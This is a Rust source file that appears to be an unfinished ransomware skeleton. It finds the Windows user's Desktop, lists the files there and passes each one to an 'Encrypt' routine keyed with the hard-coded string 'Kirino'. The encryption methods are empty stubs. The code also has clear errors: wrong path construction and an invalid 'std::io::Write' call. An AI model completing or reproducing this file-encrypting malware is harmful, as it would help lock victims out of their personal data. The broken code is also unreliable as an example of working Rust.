use std::path::PathBuf;
use thiserror::Error;
use seekable_stream_cipher::keccak::StreamCipher;
use std::fs::File;

#[derive(Debug,Error)]
pub enum FileError {
    #[error("[failed] setting paths")]
    NullOfPath,
    #[error("[failed] generating key")]
    NotVaildKey
}

#[derive(Debug)]
struct Encrypt;

impl Encrypt {
    fn new() -> Self{
        Self
    }

    fn set_offset(&mut self, off_set: String) -> Self{
        Self
    }

    fn target(&mut self, file: File) -> Self{
        Self
    }
    fn run(&mut self){

    }
}

fn get_file_names(path: &str) -> std::io::Result<Vec<String>> {
    std::fs::read_dir(path)?
        .map(|res| {
        let entry = res?;
        Ok(entry.file_name().to_string_lossy().into_owned())
    })
    .collect()
}

fn main() -> std::io::Result<()>{
    // if !(cfg!(windows)) {
        let who_am_i= match whoami::realname(){
            Ok(string) => string,
            Err(err) => err.to_string()
        };
        let mut pathbuf= PathBuf::from("C:/");
        pathbuf.push("/Users/");
        pathbuf.push(who_am_i);
        pathbuf.push("/Desktop");

        let string_pathbuf= match pathbuf.into_os_string().into_string(){
            Ok(string) => string,
            Err(os_string) => panic!("[failed] getting string_pathbuf"), 
        }; 

        let v_file_names= get_file_names(string_pathbuf.as_str())?;
        
        for file_name in v_file_names {
            let mut pathbuf= PathBuf::from("C:/");
            let mut data_buff: Box<[u8; 1024]> = Box::new([0u8; 1024]);
            
            pathbuf.push(file_name);
            
            let string_pathbuf= match pathbuf.into_os_string().into_string() {
                Ok(string) => string,
                Err(os_string) => panic!("[failed] getting string_pathbuf"), 
            };

            let file= File::open(string_pathbuf)?;

            // seekable_stream_cipher
            let mut encrypted= Encrypt::new();
            encrypted
                .set_offset("Kirino".to_string())
                .target(file)
                .run();

            std::io::Write(&mut data_buff as *mut Box<_>); 
        }

    // }
    Ok(())
}
